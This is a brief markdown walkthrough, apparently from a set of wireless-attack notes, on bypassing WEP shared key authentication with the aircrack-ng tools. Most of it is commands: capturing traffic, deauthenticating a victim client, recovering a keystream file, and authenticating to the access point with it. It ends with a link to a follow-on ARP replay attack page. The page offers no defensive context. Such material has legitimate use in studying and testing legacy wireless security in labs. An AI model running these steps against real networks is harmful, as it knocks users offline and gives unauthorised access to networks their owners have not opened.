# Bypassing Shared Key Authentication (WEP on Secured Network)

Sniff the network traffic

```sh
sudo airodump-ng -c <channel> -w wep_file wlan0mon
# Do not close this window
```

- Step 1: [Deauthenticate](../Deauthentication%20Attack.md) one victim client

```sh
sudo aireplay-ng -0 0 -c <client_mac> -e <ssid> wlan0mon
# Do not close this window
```

- Step 2: Obtain keystream from captured authentications frames

Now watch your `airodump-ng` terminal window. On the top part, you should see a message which informs you a **keystream** was recovered.
The keystream will be save in a `.xor` file

- Step 3: Authenticate with the AP using recovered keystream

```sh
sudo aireplay-ng -1 6000 -q 10 -e <ssid> -y <file.xor> wlan0mon
# Do not close this window
```

- [Step 4: Initiate ARP replay attack](./ARP%20Replay%20Attack.md)